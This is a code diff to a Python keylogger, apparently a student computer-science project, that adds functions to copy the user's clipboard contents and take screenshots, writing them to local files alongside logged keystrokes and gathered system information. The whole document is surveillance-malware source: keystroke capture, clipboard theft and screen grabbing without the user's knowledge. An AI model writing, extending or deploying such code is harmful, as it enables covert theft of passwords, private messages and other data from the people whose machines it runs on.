@@ -15,9 +15,6 @@ import win32clipboard
 import time
 import os
 
-from scipy.io.wavfile import write
-import sounddevice as sd
-
 from cryptography.fernet import Fernet
 
 import getpass
@@ -36,9 +33,14 @@ key_log = "log.txt"
 file_path = "C:\\Users\\casey\\Documents\\comp sci\\keylogger" 
 extend = "\\"
 
-
 # variable declarations for system info
 system_info = "system.txt"
+
+# variable declaration for clipboard
+clipboard_info = "clipboard.txt"
+
+# variable declaration for screenshot
+screenshot_info = "screenshot.txt"
 
 # variable declarations for keylog
 # count to check if key is pressed then written to, keys to hold the keys
@@ -93,6 +95,26 @@ def comp_info():
 
 comp_info()
 
+# paste the users clipboard data onto a file
+def copy_clipboard():
+    with open(file_path + extend + clipboard_info, "a") as file:
+        try:
+            win32clipboard.OpenClipboard()
+            data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+            file.write("Clipboard Data: \n" + data)
+        except:
+            file.write("Clipboard can not be copied")
+
+copy_clipboard()
+
+# grab a shot of the users screen
+def screenshot():
+    img = ImageGrab.grab()
+    img.save(file_path + extend + screenshot_info)
+
+screenshot()
+
 # basic key logger functionality
 def on_press(key):
     global keys, count
@@ -100,7 +122,7 @@ def on_press(key):
     keys.append(key)
     count += 1
     print("{0} pressed".format(key))
-    if count >= 1:
+    if count > 0:
         count = 0
         write_file(keys)
         keys = []
